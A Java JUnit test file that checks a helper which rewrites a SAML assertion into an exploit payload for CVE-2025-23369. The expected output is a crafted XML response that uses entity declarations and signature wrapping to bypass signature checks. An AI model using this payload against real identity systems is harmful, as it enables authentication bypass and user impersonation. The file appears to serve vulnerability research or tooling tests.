package helpers;

import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;

import static org.junit.jupiter.api.Assertions.assertEquals;

public class CVE_2025_23369_Test {

    @Test
    void testCVE_2025_23369() throws Exception {
        String originalAssertion =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                        "<Response ID=\"_original_response_ID\">" +
                        "<Issuer>SomeIssuer</Issuer>" +
                        "<Assertion ID=\"_original_assertion_ID\">" +
                        "<Signature>" +
                        "<SignedInfo>" +
                        "<Reference URI=\"#_original_assertion_ID\"/>" +
                        "</SignedInfo>" +
                        "</Signature>" +
                        "<NameID>OriginalName</NameID>" +
                        "</Assertion>" +
                        "</Response>";

        String exploitAssertion = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE response [\n" +
                "<!ENTITY idViaEntity \"_original_assertion_ID\">\n" +
                "<!ENTITY BypassIDUniqueness \"&#x50;\">\n" +
                "]>\n" +
                "<Response ID=\"&idViaEntity;\"><Issuer>SomeIssuer</Issuer><Signature><SignedInfo><Reference URI=\"#_original_assertion_ID\"/></SignedInfo><Object xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><Assertion ID=\"&BypassIDUniqueness;_original_assertion_ID\"><Signature><SignedInfo><Reference URI=\"#_original_assertion_ID\"/></SignedInfo></Signature><NameID>OriginalName</NameID></Assertion></Object></Signature><Assertion ID=\"_original_assertion_IDffff\"><NameID>OriginalName</NameID></Assertion></Response>";

        var exploit = CVE_2025_23369.apply(originalAssertion);
        assertEquals(exploitAssertion, exploit);
    }
}
